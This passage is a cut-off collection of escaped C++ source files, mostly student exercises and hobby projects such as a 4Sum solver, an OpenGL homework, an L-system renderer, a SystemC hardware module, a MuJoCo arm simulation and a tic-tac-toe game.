std::runtime_error(\"Could not open file to write: \" + filename);\n\t}\n\tfile << data;\n\tfile.close();\n}\n\nstd::string FileHandler::replaceString(const std::string &source, const std::string &s1, const std::string &s2) {\n\tstd::string result;\n\tsize_t pos = 0;\n\tsize_t lastPos = 0;\n\tsize_t s1Length = s1.length();\n\n\twhile ((pos = source.find(s1, lastPos)) != std::string::npos) {\n\t\tresult.append(source, lastPos, pos - lastPos);\n\t\tresult.append(s2);\n\t\tlastPos = pos + s1Length;\n\t}\n\tresult.append(source.substr(lastPos));\n\treturn (result);\n}\n",
    "/*\n    Problem Link: https://leetcode.com/problems/4sum/\n*/\n\nvector<vector<int>> fourSum(vector<int> &nums, int target) {\n    vector<vector<int>> result;\n    int n = nums.size();\n    // base case: min 4 elements should be there\n    if(nums.size() < 4)\n        return {};\n    // sort the vector\n    sort(nums.begin(), nums.end());\n\n    for(int i = 0; i < n - 3; i++) {\n        // avoid duplicates\n        if(i > 0 && nums[i] == nums[i - 1])\n            continue;\n        for(int j = i + 1; j < n - 2; j++) {\n            // avoid duplicates\n            if(j > i + 1 && nums[j] == nums[j - 1])\n                continue;\n            // now apply pair sum\n            int left = j + 1, right = n - 1;\n            while(left < right) {\n                int sum = nums[i] + nums[j] + nums[left] + nums[right];\n                if(sum == target) {\n                    result.push_back({nums[i], nums[j], nums[left], nums[right]});\n                    left++;\n                    // avoid duplicates\n                    while(left < right && nums[left] == nums[left - 1])\n                        left++;\n                }\n                else if(sum < target)\n                    left++;\n                else\n                    right--;\n            }\n        }\n    }\n    return result;\n}\n\n",
    "//FILE NAME:HW1\r\n//description:A beginning OpenGL program using C++ and GLUT\r\n//Author:Nabeel Alkhatib\r\n//Date created:8/22/2018\r\n//Date modified:9/2/2018\r\n#include <iostream>\r\n#include <GL\\freeglut.h>\r\nusing namespace std;\r\n\r\nvoid display()\r\n{\r\n\tglClear( GL_COLOR_BUFFER_BIT); \t\t\t\t//clears the drawing buffer\r\n\tglColor3f(0.0, 0.9, 1.0); \t\t\t\t\t//setting up the colors(RGB) of drawing\r\n\tglBegin(GL_POLYGON); \t\t\t\t\t\t//setting the Polygon mode drawning\r\n  \t\tglVertex2d(2, 4 ); \r\n  \t\tglVertex2d(4, 4 ); \r\n  \t\tglVertex2d(4, 6 ); \r\n  \t\tglVertex2d(2, 6 ); \r\n \tglEnd();  \t\t\t\t\t\t\t\t\t//ends the polygon mode\r\n\tglFlush();\t\t\t\t\t\t\t\t\t//displays drawing on screen\r\n}\r\n\r\nint main(int argc, char **argv){ \r\n\r\n\tglutInit(&argc, argv);\t\t\t\t\t\t\t//initializse openGL\r\n\tglutInitDisplayMode ( GLUT_SINGLE | GLUT_RGB);\t//set up displaymode to single buffer and color display\r\n\tglutInitWindowPosition(100,100);\t\t\t\t//set up window position(x and y)\r\n\tglutInitWindowSize(300,300);\t\t\t\t\t//set up window size(width and height)\r\n\tglutCreateWindow(\"Hello GL!\");\t\t\t\t\t//create the window and sets title of window\r\n\tglClearColor(0.0, 0.0, 0.0, 0.0);\t\t\t// black background color  \r\n\tglOrtho(0.0, 8.0, 0.0, 8.0, -1.0, 1.0);   // setup a 10x10x2 viewing world\r\n\r\n\tglutDisplayFunc(&display);\t\t\t\t\t//the drawing function to be called by openGL\r\n\tglutMainLoop();\t\t\t\t\t\t\t\t//calls the main loop of openGl\r\n\r\n   \treturn EXIT_SUCCESS;\r\n}\r\n\r\n",
    "//\n// Created by tibov on 25/02/23.\n//\n\n#include \"LSystem.h\"\n#include <algorithm>\n#include <cmath>\n#include <iostream>\n#include <stack>\n#include \"../../libraries/l_parser.h\"\n\n\n\nLSystem::LSystem(const LParser::LSystem2D &l_system, const Color &c): l_system(l_system), c(c) {\n    const double pi = 3.14159265359;\n    pos = {0, 0};\n    initiator = l_system.get_initiator();\n    start_angle = l_system.get_starting_angle()/360*2*pi;\n    delta_angle = l_system.get_angle()/360*2*pi;\n    angle = start_angle;\n    points.emplace_back(0, 0);\n\n\n    string s;\n    for (char c: initiator){\n        s += l_replace(c, l_system.get_nr_iterations());\n\n    }\n    l_fill(s);\n\n\n}\n\n\nstring LSystem::l_replace(const char &v, int amount) {\n    if (amount == 0){\n        string s(1, v);\n        return s;\n    }else{\n        if (find(l_system.get_alphabet().begin(), l_system.get_alphabet().end(), v) == l_system.get_alphabet().end()){\n            string s(1, v);\n            return s;\n        }\n\n        string s;\n        for (char c: l_system.get_replacement(v)){\n            if (find(l_system.get_alphabet().begin(), l_system.get_alphabet().end(), c) == l_system.get_alphabet().end()){\n                string t(1, c);\n                s += t;\n            }else{\n                s += l_replace(c, amount-1);\n            }\n\n        }\n        return s;\n    }\n}\n\nvoid LSystem::l_fill(const string& s){\n    stack<double> stack_x;\n    stack<double> stack_y;\n    stack<double> stack_angle;\n\n    Line2D* last_line = nullptr;\n    char last_char = '\\0';\n    for (char c: s){\n        if (c == '+'){\n            angle+=delta_angle;\n        }else if (c == '-') {\n            angle -= delta_angle;\n        }else if (c == '('){\n            stack_x.push(pos.first);\n            stack_y.push(pos.second);\n            stack_angle.push(angle);\n        }else if (c == ')'){\n            pos.first = stack_x.top();\n            stack_x.pop();\n            pos.second = stack_y.top();\n            stack_y.pop();\n            angle = stack_angle.top();\n            stack_angle.pop();\n\n            Point2D p(pos.first, pos.second);\n            points.push_back(p);\n\n        }else{\n            bool v = l_system.draw(c);\n\n            pos.first += cos(angle);\n            pos.second += sin(angle);\n            Point2D p2(pos.first, pos.second);\n            points.push_back(p2);\n\n            if (last_char == c && last_line != nullptr && v){\n                last_line->p2 = p2;\n            }else if (v){\n\n                Line2D* l = new Line2D(*(points.end()-2), *(points.end()-1), LSystem::c);\n                lines.push_back(l);\n\n                last_line = l;\n            }\n\n\n\n        }\n\n        last_char = c;\n    }\n\n}\n\nLines2D LSystem::get_lines() {\n\n    return lines;\n}\n\nLSystem::~LSystem() {\n    for (Line2D* l : lines){\n        delete l;\n    }\n}\n\n",
    "#include \"systemc.h\"\n#include \"digit.h\"\n#include \"dh_hw.h\"\n\nvoid dh_hw::process_hw()\n{\n\n  NN_DIGIT t[2], c, u, v;\n  NN_HALF_DIGIT aHigh, cLow, cHigh;\n  \n  for (;;) {  \n  \n\t    // Read inputs (blocking FIFO access)\n\t    t[0] = from_sw0.read();\n\t    t[1] = from_sw1.read();\n      c = from_sw2.read();\n      aHigh = from_sw3.read();\n\n\t\t\n\t    // Original code from NN_DigitDivHH():\t\n\n      /*** Begin: Required part (to do: Datapath + Control) ***/\n      cHigh = (NN_HALF_DIGIT)HIGH_HALF (c);\n      cLow = (NN_HALF_DIGIT)LOW_HALF (c);\n  \n      u = (NN_DIGIT)aHigh * (NN_DIGIT)cLow;\n      v = (NN_DIGIT)aHigh * (NN_DIGIT)cHigh;\n      \n      if ((t[0] -= TO_HIGH_HALF (u)) > (MAX_NN_DIGIT - TO_HIGH_HALF (u))) t[1]--;\n      \n      t[1] -= HIGH_HALF (u);\n      t[1] -= v;\n      /*** End: Required part ***/\n\n      /*** Begin: Bonus part (optional: Extra Datapath + Extra Control) ***/\n      while ((t[1] > cHigh) || ((t[1] == cHigh) && (t[0] >= TO_HIGH_HALF (cLow)))) {\n          if ((t[0] -= TO_HIGH_HALF (cLow)) > MAX_NN_DIGIT - TO_HIGH_HALF (cLow)) t[1]--;\n          t[1] -= cHigh;\n          aHigh++;\n      }\n      /*** End: Bonus part ***/\n\t\t\n      // Write outputs (blocking FIFO access)\n      to_sw0.write(t[0]);\n      to_sw1.write(t[1]);\n\t    to_sw2.write(aHigh);\n\n  }\n\t  \t  \n}\n\n",
    "// Assignment based on implementing three functoins in c++ for searching ,counting and finding occurrences for searching,counting and finding\r\n// occurrencs of a target value in a sorted array\r\n// take ARRAY  input from user\r\n\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nint n;\r\nclass Lsearch\r\n{\r\n    int arr[100], T;\r\n\r\npublic:\r\n    void accept();\r\n    void search();\r\n    void count();\r\n    void FALsearch(); // first and last element occurrecnce\r\n};\r\n\r\nvoid Lsearch::accept()\r\n{\r\n    cout << \"Enter the size of array\" << endl;\r\n    cin >> n;\r\n    cout << \"Enter the elements of array\" << endl;\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        cin >> arr[i];\r\n    }\r\n}\r\nvoid Lsearch::count()\r\n{\r\n    int count = 0;\r\n    cout << \"Enter the target valueL: \";\r\n    cin >> T;\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        if (arr[i] == T)\r\n        {\r\n            count++;\r\n        }\r\n    }\r\n    cout<<\"Couunt is: \"<<count<<endl;\r\n}\r\nvoid Lsearch::search()\r\n{\r\n    cout << \"Enter the target value: \" << endl;\r\n    cin >> T;\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        if (arr[i] == T)\r\n        {\r\n            cout<<\"Index is: \"<<i<<endl;\r\n            break;\r\n        }\r\n    }\r\n}\r\n\r\nvoid Lsearch::FALsearch() // using linear search\r\n{  \r\n    int item, first = -1;\r\n    int last = -1;\r\n\r\n    cout << \"Enter the item to be searched: \";\r\n    cin >> item;\r\n\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        if (arr[i] == item)\r\n        {\r\n            if (first == -1)\r\n            {\r\n                first = i;\r\n                last = i;\r\n        }\r\n        }\r\n    }\r\n    cout << \"First Occurrence = \" << first << endl;\r\n    cout << \"Last Occurrence = \" << last << endl;\r\n}\r\n\r\nint main()\r\n{ // switch case\r\n    int choice;\r\n    Lsearch s;\r\n    while (choice != 5)\r\n    {\r\n        cout << \"\\n\\nEnter 1 to accept the array\" << endl;\r\n        cout << \"Enter 2 to search the target value\" << endl;\r\n        cout << \"Enter 3 to count the target value\" << endl;\r\n        cout << \"Enter 4 to find first and last occurence of target value\" << endl;\r\n        cout << \"Enter 5 to exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n        switch (choice)\r\n        {\r\n        case 1:\r\n            s.accept();\r\n            break;\r\n\r\n        case 2:\r\n            s.search();\r\n            break;\r\n\r\n        case 3:\r\n            s.count();\r\n            break;\r\n\r\n        case 4:\r\n            s.FALsearch();\r\n            break;\r\n\r\n        case 5:\r\n            cout << \"Exiting....\" << endl;\r\n            break;\r\n        }\r\n    }\r\n    return 0;\r\n}",
    "#include<iostream>\r\n#include<vector>\r\n#include<algorithm>\r\nusing namespace std;\r\n\r\nstruct Search {\r\n\tint s;//\u771f\u30de\u30c3\u30d7\u3067\u306e\u30b9\u30bf\u30fc\u30c8\u30de\u30b9\r\n\tint g;//\u771f\u30de\u30c3\u30d7\u3067\u306e\u30b4\u30fc\u30eb\u30de\u30b9\r\n\tint side;//\u771f\u30de\u30c3\u30d7\u306e\u6a2a\u306e\u30de\u30b9\u6570\r\n\tvector<int>cell;\r\n\t\r\n\tvoid Compare() {\r\n\t\tint length = side + 2;//\u4eee\u30de\u30c3\u30d7\u306e\u6a2a\u306e\u30de\u30b9\u6570\r\n\t\tint start = length + s + (s - 1) / side * 2;//\u4eee\u30de\u30c3\u30d7\u3067\u306e\u30b9\u30bf\u30fc\u30c8\u30de\u30b9\r\n\t\tint goal = length + g + (g - 1) / side * 2;//\u4eee\u30de\u30c3\u30d7\u3067\u306e\u30b4\u30fc\u30eb\u30de\u30b9\r\n\r\n\t\tvector<int>v1{ -1 * length,-1,1,length };\r\n\t\tvector<int>v2;\r\n\t\tvector<int>v3;\r\n\t\tv2.push_back(0);\r\n\t\tv2.push_back(start);\r\n\r\n\t\tfor (int j = 1;j < 100;j = j + 1) {\r\n\r\n\t\t\tint now = v2[j];\r\n\t\t\t\r\n\t\t\tint compare = 100;\r\n\t\t\tint n;\r\n\t\t\tif (now == goal)break;//\u73fe\u5728\u5730\u304cgoal\u306b\u306a\u3063\u305f\u3089\u63a2\u7d22\u7d42\u4e86\r\n\t\t\tfor (int i = 0;i < 4;i = i + 1) {//\u73fe\u5728\u5730\u306e\u4e0a\u4e0b\u5de6\u53f3\u306e\u30de\u30b9\u3092\u8abf\u3079\u308b\r\n\r\n\t\t\t\tint c = now + v1[i];\r\n\t\t\t\tint target = c;\r\n\t\t\t\tauto pos = find(v2.begin(), v2.end(), target);\r\n\r\n\t\t\t\tif (pos == v2.end()) {//\u901a\u3063\u3066\u304d\u305f\u30de\u30b9\u306f\u8abf\u3079\u306a\u3044\r\n\r\n\t\t\t\t\t\r\n\t\t\t\t\tint g = 0;//\u79fb\u52d5\u30b3\u30b9\u30c8\r\n\t\t\t\t\tint g_hat = 0;\r\n\t\t\t\t\tif (v2.size() == 2) {\r\n\t\t\t\t\t\tg = cell[c];\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif (v2.size() > 2) {\r\n\r\n\t\t\t\t\t\tfor (int k = 2;k < v2.size();k = k + 1) {\r\n\t\t\t\t\t\t\tint l = v2[k];\r\n\t\t\t\t\t\t\tg_hat = g_hat + cell[l];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tg = cell[c] + g_hat;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tint x = (c % length + 1);//\u8abf\u67fb\u5730\u306e\u5ea7\u6a19\r\n\t\t\t\t\tint y = (c / length + 1);\r\n\t\t\t\t\tint fin_x = (goal % length + 1);//\u30b4\u30fc\u30eb\u306e\u5ea7\u6a19\r\n\t\t\t\t\tint fin_y = (goal / length + 1);\r\n\t\t\t\t\tint h;//\u63a8\u5b9a\u30b3\u30b9\u30c8\r\n\t\t\t\t\tif (x <= fin_x)h = fin_x - x + fin_y - y;\r\n\t\t\t\t\telse h = x - fin_x + fin_y - y;\r\n\t\t\t\t\tint f = g + h;\r\n\t\t\t\t\tif (f < compare) {//\u73fe\u5728\u5024\u306e\u4e0a\u4e0b\u5de6\u53f3\u306b\u3042\u308b\u30bb\u30eb\u306e\u4e2d\u3067\u5408\u8a08\u30b3\u30b9\u30c8\u304c\u6700\u5c0f\u306e\u30bb\u30eb\u3092\u8abf\u3079\u308b\r\n\t\t\t\t\t\tcompare = f;\r\n\t\t\t\t\t\tn = c;\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tv2.push_back(n);\r\n\t\t}\r\n\t\tfor (int m = 1;m < v2.size();m = m + 1) {\r\n\t\t\tint o = (v2[m] / length - 1) * (length - 2) + v2[m] % length;\r\n\t\t\tv3.push_back(o);\r\n\t\t}\r\n\t\tfor (auto a : v3)cout << a << \",\";\r\n\t\tcout << endl;\r\n\r\n\r\n\r\n\t}\r\n};\r\n\r\n\r\nint main() {\r\n\tvector<int>cell_1 = { 100,100,100,100,\r\n\t\t\t\t   \t\t  100,100,1,  100,\r\n\t\t\t\t\t\t  100,3,  1,  100,\r\n\t\t\t\t\t\t  100,3,  1,  100,\r\n\t\t\t\t\t\t  100,3,  1,  100,\r\n\t\t\t\t\t\t  100,3,  1,  100,\r\n\t\t\t\t\t\t  100,3,  1,  100,\r\n\t\t\t\t\t\t  100,3,  1,  100,\r\n\t\t\t\t\t\t  100,0,  1,  100,\r\n\t\t\t\t\t\t  100,100,100,100, };\r\n\tSearch map1{ 1,15,2, cell_1 };//[start,goal,\u6a2a\u306e\u30de\u30b9\u6570,map\u540d]\r\n\tmap1.Compare();\r\n\r\n\tvector<int>cell_2 = {\r\n\t100,100,100,100,100,100,100,100,100,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,100,100,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,100,100,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,100,100,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,100,100,100,100,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,100,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,1  ,1  ,1  ,1  ,1  ,1  ,1  ,1  ,100,\r\n\t100,100,100,100,100,100,100,100,100,100, };\r\n\t\r\n\t\r\n\tSearch map2{ 8,105,8, cell_2 };\r\n\tmap2.Compare();\r\n}\r\n\t\t",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string>\r\n#include <gtest/gtest.h>\r\n#include \"DLL.h\"\r\n\r\nusing PerformanceData = std::pair<int, std::string>;\r\n\r\n// \u30ea\u30b9\u30c8\u306e\u5185\u5bb9\u3092\u8868\u793a\u3059\u308b\u95a2\u6570\r\n// \u5165\u529b: DoublyLinkedList<PerformanceData> \u578b\u306e\u30ea\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30ea\u30b9\u30c8\u306e\u5168\u8981\u7d20\u3092\u30b3\u30f3\u30bd\u30fc\u30eb\u306b\u8868\u793a\u3059\u308b\r\nvoid displayList(const DoublyLinkedList<PerformanceData>& list) {\r\n    for (auto it = list.begin(); it != list.end(); ++it) {\r\n        std::cout << \"Score: \" << it->first << \", User Name: \" << it->second << std::endl;\r\n    }\r\n}\r\n\r\n// \u30d5\u30a1\u30a4\u30eb\u304b\u3089\u30b9\u30b3\u30a2\u3092\u8aad\u307f\u53d6\u308a\u30ea\u30b9\u30c8\u306b\u633f\u5165\u3059\u308b\u95a2\u6570\r\n// \u5165\u529b: \u30d5\u30a1\u30a4\u30eb\u540d (std::string), DoublyLinkedList<PerformanceData> \u578b\u306e\u30ea\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30d5\u30a1\u30a4\u30eb\u304b\u3089\u8aad\u307f\u53d6\u3063\u305f\u30b9\u30b3\u30a2\u3092\u30ea\u30b9\u30c8\u306b\u633f\u5165\u3059\u308b\r\nvoid readScoresFromFile(const std::string& filename, DoublyLinkedList<PerformanceData>& list) {\r\n    std::ifstream file(filename);\r\n    if (!file.is_open()) {\r\n        std::cerr << \"Failed to open file: \" << filename << std::endl;\r\n        return;\r\n    }\r\n\r\n    std::string line;\r\n    while (std::getline(file, line)) {\r\n        std::istringstream iss(line);\r\n        int score;\r\n        std::string username;\r\n        if (iss >> score >> username) {\r\n            list.Insert(list.end(), std::make_pair(score, username));\r\n        }\r\n    }\r\n    file.close();\r\n}\r\n\r\n// \u30e1\u30a4\u30f3\u95a2\u6570\r\n// \u5165\u529b: \u30b3\u30de\u30f3\u30c9\u30e9\u30a4\u30f3\u5f15\u6570\r\n// \u671f\u5f85\u7d50\u679c: \u30d5\u30a1\u30a4\u30eb\u304b\u3089\u30b9\u30b3\u30a2\u3092\u8aad\u307f\u8fbc\u307f\u3001\u30ea\u30b9\u30c8\u306b\u633f\u5165\u3057\u3066\u8868\u793a\u3057\u3001Google Test\u3092\u5b9f\u884c\u3059\u308b\r\nint main(int argc, char** argv) {\r\n    DoublyLinkedList<PerformanceData> scoreList;\r\n\r\n    // \u30d5\u30a1\u30a4\u30eb\u304b\u3089\u30b9\u30b3\u30a2\u3092\u8aad\u307f\u53d6\u308a\u3001\u30c0\u30d6\u30eb\u30ea\u30f3\u30af\u30ea\u30b9\u30c8\u306b\u4fdd\u5b58\r\n    readScoresFromFile(\"Scores.txt\", scoreList);\r\n\r\n    // \u30c0\u30d6\u30eb\u30ea\u30f3\u30af\u30ea\u30b9\u30c8\u306b\u4fdd\u5b58\u3055\u308c\u305f\u30b9\u30b3\u30a2\u3092\u8868\u793a\r\n    displayList(scoreList);\r\n\r\n    ::testing::InitGoogleTest(&argc, argv);\r\n    return RUN_ALL_TESTS();\r\n}\r\n",
    "#include <mujoco/mujoco.h>\n#include <GLFW/glfw3.h>\n#include <iostream>\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <cmath>\n\n// \u30b0\u30ed\u30fc\u30d0\u30eb\u5909\u6570\nmjModel* m = nullptr;        // MuJoCo model\nmjData* d = nullptr;         // MuJoCo data\nmjvCamera cam;               // \u30ab\u30e1\u30e9\nmjvOption opt;               // \u30aa\u30d7\u30b7\u30e7\u30f3\nmjvScene scn;                // \u30b7\u30fc\u30f3\nmjrContext con;              // \u30b3\u30f3\u30c6\u30ad\u30b9\u30c8\n\nbool button_left = false;\nbool button_middle = false;\nbool button_right = false;\ndouble lastx = 0;\ndouble lasty = 0;\nbool reset_simulation = false;\nbool goal_reached = false;   // \u76ee\u6a19\u306b\u5230\u9054\u3057\u305f\u304b\u3069\u3046\u304b\u306e\u30d5\u30e9\u30b0\n\n// \u30d8\u30eb\u30d1\u30fc\u95a2\u6570\ndouble deg2rad(double deg) {\n    return deg * M_PI / 180.0;\n}\n\n// \u521d\u671f\u59ff\u52e2\u306e\u5b9a\u7fa9\nstd::pair<double, double> initial_position = {deg2rad(15), deg2rad(15)};\nstd::pair<double, double> goal_position;  // \u30b4\u30fc\u30eb\u4f4d\u7f6e\u3092\u683c\u7d0d\u3059\u308b\u305f\u3081\u306e\u5909\u6570\n\n// \u30a2\u30af\u30c1\u30e5\u30a8\u30fc\u30bf\u306e\u76ee\u6a19\u4f4d\u7f6e\u3092\u8a2d\u5b9a\u3059\u308b\u95a2\u6570\nvoid set_actuator_targets(double target1, double target2) {\n    d->ctrl[mj_name2id(m, mjOBJ_ACTUATOR, \"joint1\")] = target1;\n    d->ctrl[mj_name2id(m, mjOBJ_ACTUATOR, \"joint2\")] = target2;\n}\n\n// \u73fe\u5728\u306e\u30b8\u30e7\u30a4\u30f3\u30c8\u4f4d\u7f6e\u304c\u76ee\u6a19\u4f4d\u7f6e\u306b\u8fd1\u3044\u304b\u3069\u3046\u304b\u3092\u30c1\u30a7\u30c3\u30af\u3059\u308b\u95a2\u6570\nbool is_position_reached(double target1, double target2, double threshold = 0.01) {\n    double joint1_pos = d->qpos[mj_name2id(m, mjOBJ_JOINT, \"joint1\")];\n    double joint2_pos = d->qpos[mj_name2id(m, mjOBJ_JOINT, \"joint2\")];\n    return (std::abs(joint1_pos - target1) < threshold) && (std::abs(joint2_pos - target2) < threshold);\n}\n\n// \u30de\u30a6\u30b9\u30dc\u30bf\u30f3\u30b3\u30fc\u30eb\u30d0\u30c3\u30af\nvoid mouse_button(GLFWwindow* window, int button, int act, int mods) {\n    // update button state\n    button_left = (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_LEFT) == GLFW_PRESS);\n    button_middle = (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_MIDDLE) == GLFW_PRESS);\n    button_right = (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_RIGHT) == GLFW_PRESS);\n\n    // update last click position\n    glfwGetCursorPos(window, &lastx, &lasty);\n}\n\n// \u30ab\u30fc\u30bd\u30eb\u4f4d\u7f6e\u30b3\u30fc\u30eb\u30d0\u30c3\u30af\nvoid mouse_move(GLFWwindow* window, double xpos, double ypos) {\n    // no buttons down: nothing to do\n    if (!button_left && !button_middle && !button_right) {\n        return;\n    }\n\n    // compute mouse displacement, save\n    double dx = xpos - lastx;\n    double dy = ypos - lasty;\n    lastx = xpos;\n    lasty = ypos;\n\n    // determine action based on mouse button\n    int width, height;\n    glfwGetWindowSize(window, &width, &height);\n\n    bool shift = (glfwGetKey(window, GLFW_KEY_LEFT_SHIFT) == GLFW_PRESS || \n                  glfwGetKey(window, GLFW_KEY_RIGHT_SHIFT) == GLFW_PRESS);\n\n    mjtMouse action;\n    if (button_right) {\n        action = shift ? mjMOUSE_MOVE_H : mjMOUSE_MOVE_V;\n    } else if (button_left) {\n        action = shift ? mjMOUSE_ROTATE_H : mjMOUSE_ROTATE_V;\n    } else {\n        action = mjMOUSE_ZOOM;\n    }\n\n    // move camera\n    mjv_moveCamera(m, action, dx / height, dy / height, &scn, &cam);\n}\n\n// \u30b9\u30af\u30ed\u30fc\u30eb\u30b3\u30fc\u30eb\u30d0\u30c3\u30af\nvoid scroll(GLFWwindow* window, double xoffset, double yoffset) {\n    // emulate vertical mouse motion = 5% of window height\n    mjv_moveCamera(m, mjMOUSE_ZOOM, 0, -0.05 * yoffset, &scn, &cam);\n}\n\n// \u30ad\u30fc\u30b3\u30fc\u30eb\u30d0\u30c3\u30af\nvoid key_callback(GLFWwindow* window, int key, int scancode, int action, int mods) {\n    if (action == GLFW_PRESS) {\n        if (key == GLFW_KEY_R) {\n            // \u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3092\u30ea\u30bb\u30c3\u30c8\u3059\u308b\u30d5\u30e9\u30b0\u3092\u7acb\u3066\u308b\n            reset_simulation = true;\n            goal_reached = false;  // \u30d5\u30e9\u30b0\u3092\u30ea\u30bb\u30c3\u30c8\n        }\n    }\n}\n\n// \u30b5\u30a4\u30c8\u4f4d\u7f6e\u3092\u53d6\u5f97\u3059\u308b\u95a2\u6570\nstd::pair<double, double> get_site_position(const mjModel* m, const mjData* d, const char* site_name) {\n    int site_id = mj_name2id(m, mjOBJ_SITE, site_name);\n    if (site_id == -1) {\n        std::cerr << \"Site \" << site_name << \" not found\" << std::endl;\n        return {0.0, 0.0};  // \u30c7\u30d5\u30a9\u30eb\u30c8\u5024\u3092\u8fd4\u3059\n    }\n\n    const mjtNum* site_pos = d->site_xpos + 3 * site_id;\n    std::cout << \"Position of site \" << site_name << \": \"\n              << site_pos[0] << \", \" << site_pos[1] << \", \" << site_pos[2] << std::endl;\n\n    return {site_pos[0], site_pos[1]};\n}\n\n// \u521d\u671f\u306e\u30b5\u30a4\u30c8\u4f4d\u7f6e\u3092\u53d6\u5f97\u3059\u308b\u95a2\u6570\nstd::pair<double, double> get_initial_site_position(const mjModel* m, const mjData* d, const char* site_name) {\n    int site_id = mj_name2id(m, mjOBJ_SITE, site_name);\n    if (site_id == -1) {\n        std::cerr << \"Initial site \" << site_name << \" not found\" << std::endl;\n        return {0.0, 0.0};  // \u30c7\u30d5\u30a9\u30eb\u30c8\u5024\u3092\u8fd4\u3059\n    }\n\n    const mjtNum* site_pos = d->site_xpos + 3 * site_id;\n    std::cout << \"Initial position of site \" << site_name << \": \"\n              << site_pos[0] << \", \" << site_pos[1] << \", \" << site_pos[2] << std::endl;\n\n    return {site_pos[0], site_pos[1]};\n}\n\n// \u521d\u671f\u59ff\u52e2\u3092\u8a2d\u5b9a\u3059\u308b\u95a2\u6570\nvoid set_initial_position() {\n    set_actuator_targets(initial_position.first, initial_position.second);\n    while (!is_position_reached(initial_position.first, initial_position.second)) {\n        mj_step(m, d);\n\n        // \u30ec\u30f3\u30c0\u30ea\u30f3\u30b0\n        mjrRect viewport = {0, 0, 0, 0};\n        glfwGetFramebufferSize(glfwGetCurrentContext(), &viewport.width, &viewport.height);\n        mjv_updateScene(m, d, &opt, nullptr, &cam, mjCAT_ALL, &scn);\n        mjr_render(viewport, &scn, &con);\n        glfwSwapBuffers(glfwGetCur",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nclass TicTacToe {\nprivate:\n    char Playing_zone[3][3];\n    string player1, player2;\n    int row, column;\n    char token;\n    bool tie;\n\npublic:\n    TicTacToe();\n    void displayBoard();\n    void getPlayersNames();\n    void makeMove();\n    bool checkWinner();\n    void play();\n};\n\nTicTacToe::TicTacToe() : token('X'), tie(false) {\n    char initial = '1';\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            Playing_zone[i][j] = initial++;\n        }\n    }\n}\n\nvoid TicTacToe::displayBoard() {\n    cout << \"    |    |    \" << endl;\n    for (int i = 0; i < 3; ++i) {\n        cout << \" \" << Playing_zone[i][0] << \"  | \" << Playing_zone[i][1] << \"  | \" << Playing_zone[i][2] << endl;\n        if (i < 2) {\n            cout << \"____|____|____\" << endl;\n            cout << \"    |    |    \" << endl;\n        }\n    }\n    cout << \"    |    |    \" << endl;\n}\n\nvoid TicTacToe::getPlayersNames() {\n    cout << \"Enter the name of 1st player: \";\n    getline(cin, player1);\n    cout << \"Enter the name of 2nd player: \";\n    getline(cin, player2);\n    cout << player1 << \" will go first.\" << endl;\n}\n\nvoid TicTacToe::makeMove() {\n    int digit;\n    bool validMove = false;\n\n    while (!validMove) {\n        if (token == 'X') {\n            cout << player1 << \", please enter a number (1-9): \";\n        } else {\n            cout << player2 << \", please enter a number (1-9): \";\n        }\n        cin >> digit;\n\n        switch (digit) {\n            case 1: row = 0; column = 0; break;\n            case 2: row = 0; column = 1; break;\n            case 3: row = 0; column = 2; break;\n            case 4: row = 1; column = 0; break;\n            case 5: row = 1; column = 1; break;\n            case 6: row = 1; column = 2; break;\n            case 7: row = 2; column = 0; break;\n            case 8: row = 2; column = 1; break;\n            case 9: row = 2; column = 2; break;\n            default:\n                cout << \"Invalid input! Please enter a number between 1 and 9.\" << endl;\n                continue;\n        }\n\n        if (Playing_zone[row][column] != 'X' && Playing_zone[row][column] != 'O') {\n            Playing_zone[row][column] = token;\n            validMove = true;\n            token = (token == 'X') ? 'O' : 'X';\n        } else {\n            cout << \"The cell is already occupied. Please choose another cell.\" << endl;\n        }\n    }\n}\n\nbool TicTacToe::checkWinner() {\n    for (int i = 0; i < 3; ++i) {\n        if ((Playing_zone[i][0] == Playing_zone[i][1] && Playing_zone[i][0] == Playing_zone[i][2]) ||\n            (Playing_zone[0][i] == Playing_zone[1][i] && Playing_zone[0][i] == Playing_zone[2][i])) {\n            return true;\n        }\n    }\n\n    if ((Playing_zone[0][0] == Playing_zone[1][1] && Playing_zone[0][0] == Playing_zone[2][2]) ||\n        (Playing_zone[0][2] == 